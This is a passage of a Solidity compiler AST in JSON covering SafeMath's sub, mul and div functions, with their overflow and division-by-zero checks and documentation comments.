												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "1333:22:2"
									},
									"returnParameters": {
										"id": 155,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 154,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 163,
												"src": "1379:7:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 153,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "1379:7:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "1378:9:2"
									},
									"scope": 313,
									"src": "1321:134:2",
									"stateMutability": "pure",
									"virtual": false,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 190,
										"nodeType": "Block",
										"src": "1841:92:2",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"commonType": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															"id": 178,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"argumentTypes": null,
																"id": 176,
																"name": "b",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 168,
																"src": "1859:1:2",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": "<=",
															"rightExpression": {
																"argumentTypes": null,
																"id": 177,
																"name": "a",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 166,
																"src": "1864:1:2",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"src": "1859:6:2",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														{
															"argumentTypes": null,
															"id": 179,
															"name": "errorMessage",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 170,
															"src": "1867:12:2",
															"typeDescriptions": {
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															},
															{
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															}
														],
														"id": 175,
														"name": "require",
														"nodeType": "Identifier",
														"overloadedDeclarations": [
															-18,
															-18
														],
														"referencedDeclaration": -18,
														"src": "1851:7:2",
														"typeDescriptions": {
															"typeIdentifier": "t_function_require_pure$_t_bool_$_t_string_memory_ptr_$returns$__$",
															"typeString": "function (bool,string memory) pure"
														}
													},
													"id": 180,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "1851:29:2",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 181,
												"nodeType": "ExpressionStatement",
												"src": "1851:29:2"
											},
											{
												"assignments": [
													183
												],
												"declarations": [
													{
														"constant": false,
														"id": 183,
														"mutability": "mutable",
														"name": "c",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 190,
														"src": "1890:9:2",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 182,
															"name": "uint256",
															"nodeType": "ElementaryTypeName",
															"src": "1890:7:2",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 187,
												"initialValue": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 186,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"id": 184,
														"name": "a",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 166,
														"src": "1902:1:2",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "-",
													"rightExpression": {
														"argumentTypes": null,
														"id": 185,
														"name": "b",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 168,
														"src": "1906:1:2",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "1902:5:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "1890:17:2"
											},
											{
												"expression": {
													"argumentTypes": null,
													"id": 188,
													"name": "c",
													"nodeType": "Identifier",
													"overloadedDeclarations": [],
													"referencedDeclaration": 183,
													"src": "1925:1:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"functionReturnParameters": 174,
												"id": 189,
												"nodeType": "Return",
												"src": "1918:8:2"
											}
										]
									},
									"documentation": {
										"id": 164,
										"nodeType": "StructuredDocumentation",
										"src": "1461:280:2",
										"text": " @dev Returns the subtraction of two unsigned integers, reverting with custom message on\n overflow (when the result is negative).\n Counterpart to Solidity's `-` operator.\n Requirements:\n - Subtraction cannot overflow."
									},
									"id": 191,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "sub",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 171,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 166,
												"mutability": "mutable",
												"name": "a",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 191,
												"src": "1759:9:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 165,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "1759:7:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 168,
												"mutability": "mutable",
												"name": "b",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 191,
												"src": "1770:9:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 167,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "1770:7:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 170,
												"mutability": "mutable",
												"name": "errorMessage",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 191,
												"src": "1781:26:2",
												"stateVariable": false,
												"storageLocation": "memory",
												"typeDescriptions": {
													"typeIdentifier": "t_string_memory_ptr",
													"typeString": "string"
												},
												"typeName": {
													"id": 169,
													"name": "string",
													"nodeType": "ElementaryTypeName",
													"src": "1781:6:2",
													"typeDescriptions": {
														"typeIdentifier": "t_string_storage_ptr",
														"typeString": "string"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "1758:50:2"
									},
									"returnParameters": {
										"id": 174,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 173,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 191,
												"src": "1832:7:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 172,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "1832:7:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "1831:9:2"
									},
									"scope": 313,
									"src": "1746:187:2",
									"stateMutability": "pure",
									"virtual": false,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 225,
										"nodeType": "Block",
										"src": "2247:392:2",
										"statements": [
											{
												"condition": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 203,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"id": 201,
														"name": "a",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 194,
														"src": "2479:1:2",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "==",
													"rightExpression": {
														"argumentTypes": null,
														"hexValue": "30",
														"id": 202,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"kind": "number",
														"lValueRequested": false,
														"nodeType": "Literal",
														"src": "2484:1:2",
														"subdenomination": null,
														"typeDescriptions": {
															"typeIdentifier": "t_rational_0_by_1",
															"typeString": "int_const 0"
														},
														"value": "0"
													},
													"src": "2479:6:2",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"falseBody": null,
												"id": 207,
												"nodeType": "IfStatement",
												"src": "2475:45:2",
												"trueBody": {
													"id": 206,
													"nodeType": "Block",
													"src": "2487:33:2",
													"statements": [
														{
															"expression": {
																"argumentTypes": null,
																"hexValue": "30",
																"id": 204,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "number",
																"lValueRequested": false,
																"nodeType": "Literal",
																"src": "2508:1:2",
																"subdenomination": null,
																"typeDescriptions": {
																	"typeIdentifier": "t_rational_0_by_1",
																	"typeString": "int_const 0"
																},
																"value": "0"
															},
															"functionReturnParameters": 200,
															"id": 205,
															"nodeType": "Return",
															"src": "2501:8:2"
														}
													]
												}
											},
											{
												"assignments": [
													209
												],
												"declarations": [
													{
														"constant": false,
														"id": 209,
														"mutability": "mutable",
														"name": "c",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 225,
														"src": "2530:9:2",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 208,
															"name": "uint256",
															"nodeType": "ElementaryTypeName",
															"src": "2530:7:2",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 213,
												"initialValue": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 212,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"id": 210,
														"name": "a",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 194,
														"src": "2542:1:2",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "*",
													"rightExpression": {
														"argumentTypes": null,
														"id": 211,
														"name": "b",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 196,
														"src": "2546:1:2",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "2542:5:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "2530:17:2"
											},
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"commonType": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															"id": 219,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"argumentTypes": null,
																"commonType": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																},
																"id": 217,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftExpression": {
																	"argumentTypes": null,
																	"id": 215,
																	"name": "c",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 209,
																	"src": "2565:1:2",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"nodeType": "BinaryOperation",
																"operator": "/",
																"rightExpression": {
																	"argumentTypes": null,
																	"id": 216,
																	"name": "a",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 194,
																	"src": "2569:1:2",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"src": "2565:5:2",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": "==",
															"rightExpression": {
																"argumentTypes": null,
																"id": 218,
																"name": "b",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 196,
																"src": "2574:1:2",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"src": "2565:10:2",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														{
															"argumentTypes": null,
															"hexValue": "536166654d6174683a206d756c7469706c69636174696f6e206f766572666c6f77",
															"id": 220,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "string",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "2577:35:2",
															"subdenomination": null,
															"typeDescriptions": {
																"typeIdentifier": "t_stringliteral_9113bb53c2876a3805b2c9242029423fc540a728243ce887ab24c82cf119fba3",
																"typeString": "literal_string \"SafeMath: multiplication overflow\""
															},
															"value": "SafeMath: multiplication overflow"
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															},
															{
																"typeIdentifier": "t_stringliteral_9113bb53c2876a3805b2c9242029423fc540a728243ce887ab24c82cf119fba3",
																"typeString": "literal_string \"SafeMath: multiplication overflow\""
															}
														],
														"id": 214,
														"name": "require",
														"nodeType": "Identifier",
														"overloadedDeclarations": [
															-18,
															-18
														],
														"referencedDeclaration": -18,
														"src": "2557:7:2",
														"typeDescriptions": {
															"typeIdentifier": "t_function_require_pure$_t_bool_$_t_string_memory_ptr_$returns$__$",
															"typeString": "function (bool,string memory) pure"
														}
													},
													"id": 221,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "2557:56:2",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 222,
												"nodeType": "ExpressionStatement",
												"src": "2557:56:2"
											},
											{
												"expression": {
													"argumentTypes": null,
													"id": 223,
													"name": "c",
													"nodeType": "Identifier",
													"overloadedDeclarations": [],
													"referencedDeclaration": 209,
													"src": "2631:1:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"functionReturnParameters": 200,
												"id": 224,
												"nodeType": "Return",
												"src": "2624:8:2"
											}
										]
									},
									"documentation": {
										"id": 192,
										"nodeType": "StructuredDocumentation",
										"src": "1939:236:2",
										"text": " @dev Returns the multiplication of two unsigned integers, reverting on\n overflow.\n Counterpart to Solidity's `*` operator.\n Requirements:\n - Multiplication cannot overflow."
									},
									"id": 226,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "mul",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 197,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 194,
												"mutability": "mutable",
												"name": "a",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 226,
												"src": "2193:9:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 193,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "2193:7:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 196,
												"mutability": "mutable",
												"name": "b",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 226,
												"src": "2204:9:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 195,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "2204:7:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "2192:22:2"
									},
									"returnParameters": {
										"id": 200,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 199,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 226,
												"src": "2238:7:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 198,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "2238:7:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "2237:9:2"
									},
									"scope": 313,
									"src": "2180:459:2",
									"stateMutability": "pure",
									"virtual": false,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 242,
										"nodeType": "Block",
										"src": "3168:63:2",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"id": 237,
															"name": "a",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 229,
															"src": "3189:1:2",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														{
															"argumentTypes": null,
															"id": 238,
															"name": "b",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 231,
															"src": "3192:1:2",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														{
															"argumentTypes": null,
															"hexValue": "536166654d6174683a206469766973696f6e206279207a65726f",
															"id": 239,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "string",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "3195:28:2",
															"subdenomination": null,
															"typeDescriptions": {
																"typeIdentifier": "t_stringliteral_5b7cc70dda4dc2143e5adb63bd5d1f349504f461dbdfd9bc76fac1f8ca6d019f",
																"typeString": "literal_string \"SafeMath: division by zero\""
															},
															"value": "SafeMath: division by zero"
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															{
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															{
																"typeIdentifier": "t_stringliteral_5b7cc70dda4dc2143e5adb63bd5d1f349504f461dbdfd9bc76fac1f8ca6d019f",
																"typeString": "literal_string \"SafeMath: division by zero\""
															}
														],
														"id": 236,
														"name": "div",
														"nodeType": "Identifier",
														"overloadedDeclarations": [
															243,
															271
														],
														"referencedDeclaration": 271,
														"src": "3185:3:2",
														"typeDescriptions": {
															"typeIdentifier": "t_function_internal_pure$_t_uint256_$_t_uint256_$_t_string_memory_ptr_$returns$_t_uint256_$",
															"typeString": "function (uint256,uint256,string memory) pure returns (uint256)"
														}
													},
													"id": 240,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "3185:39:2",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"functionReturnParameters": 235,
												"id": 241,
												"nodeType": "Return",
												"src": "3178:46:2"
											}
										]
									},
									"documentation": {
										"id": 227,
										"nodeType": "StructuredDocumentation",
										"src": "2645:451:2",
										"text": " @dev Returns the integer division of two unsigned integers. Reverts on\n division by zero. The result is rounded towards zero.\n Counterpart to Solidity's `/` operator. Note: this function uses a\n `revert` opcode (which leaves remaining gas untouched) while Solidity\n uses an invalid opcode to revert (consuming all remaining gas).\n Requirements:\n - The divisor cannot be zero."
									},
									"id": 243,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "div",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 232,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 229,
												"mutability": "mutable",
												"name": "a",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 243,
												"src": "3114:9:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 228,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "3114:7:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 231,
												"mutability": "mutable",
												"name": "b",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 243,
												"src": "3125:9:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 230,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "3125:7:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "3113:22:2"
									},
									"returnParameters": {
										"id": 235,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 234,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 243,
												"src": "3159:7:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 233,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "3159:7:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "3158:9:2"
									},
									"scope": 313,
									"src": "3101:130:2",
									"stateMutability": "pure",
									"virtual": false,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 270,
										"nodeType": "Block",
										"src": "3808:177:2",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"commonType": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															"id": 258,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"argumentTypes": null,
																"id": 256,
																"name": "b",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 248,
																"src": "3826:1:2",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": ">",
															"rightExpression": {
																"argumentTypes": null,
																"hexValue": "30",
																"id": 257,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "number",
																"lValueRequested": false,
																"nodeType": "Literal",
																"src": "3830:1:2",
																"subdenomination": null,
																"typeDescriptions": {
																	"typeIdentifier": "t_rational_0_by_1",
																	"typeString": "int_const 0"
																},
																"value": "0"
															},
															"src": "3826:5:2",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														{
															"argumentTypes": null,
															"id": 259,
															"name": "errorMessage",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 250,
															"src": "3833:12:2",
															"typeDescriptions": {
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															},
															{
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															}
														],
														"id": 255,
														"name": "require",
														"nodeType": "Identifier",
														"overloadedDeclarations": [
															-18,
															-18
														],
														"referencedDeclaration": -18,
														"src": "3818:7:2",
														"typeDescriptions": {
															"typeIdentifier": "t_function_require_pure$_t_bool_$_t_string_memory_ptr_$returns$__$",
															"typeString": "function (bool,string memory) pure"
														}
													},
													"id": 260,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "3818:28:2",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 261,
												"nodeType": "ExpressionStatement",
												"src": "3818:28:2"
											},
											{
												"assignments": [
													263
												],
												"declarations": [
													{
														"constant": false,
														"id": 263,
														"mutability": "mutable",
														"name": "c",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 270,
														"src": "3856:9:2",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 262,
															"name": "uint256",
															"nodeType": "ElementaryTypeName",
															"src": "3856:7:2",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 267,
												"initialValue": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 266,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"id": 264,
														"name": "a",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 246,
														"src": "3868:1:2",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "/",
													"rightExpression": {
														"argumentTypes": null,
														"id": 265,
														"name": "b",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 248,
														"src": "3872:1:2",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "3868:5:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "3856:17:2"
											},
											{
												"expression": {
													"argumentTypes": null,
													"id": 268,
													"name": "c",
													"nodeType": "Identifier",
													"overloadedDeclarations": [],
													"referencedDeclaration": 263,
													"src": "3977:1:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"functionReturnParameters": 254,
												"id": 269,
												"nodeType": "Return",
												"src": "3970:8:2"
											}
										]
									},
									"documentation": {
										"id": 244,
										"nodeType": "StructuredDocumentation",
										"src": "3237:471:2",
										"text": " @dev Returns the integer division of two unsigned integers. Reverts with custom message on\n division by zero. The result is rounded towards zero.\n Counterpart to Solidity's `/` operator. Note: this function uses a\n `revert` opcode (which leaves remaining gas untouched) while Solidity\n uses an invalid opcode to revert (consuming all remaining gas).\n Requirements:\n - The divisor cannot be zero."
									},
									"id": 271,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "div",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 251,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 246,
												"mutability": "mutable",
												"name": "a",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 271,
												"src": "3726:9:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 245,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "3726:7:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 248,
												"mutability": "mutable",
												"name": "b",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 271,
												"src": "3737:9:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 247,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "3737:7:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 250,
												"mutability": "mutable",
												"name": "errorMessage",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 271,
												"src": "3748:26:2",
												"stateVariable": false,
												"storageLocation": "memory",
												"typeDescriptions": {
													"typeIdentifier": "t_string_memory_ptr",
													"typeString": "string"
												},
												"typeName": {
													"id": 249,
													"name": "string",
													"nodeType": "ElementaryTypeName",
													"src": "3748:6:2",
													"typeDescriptions": {
														"typeIdentifier": "t_string_storage_ptr",
														"typeString": "string"
													}
												},
												"value": null,
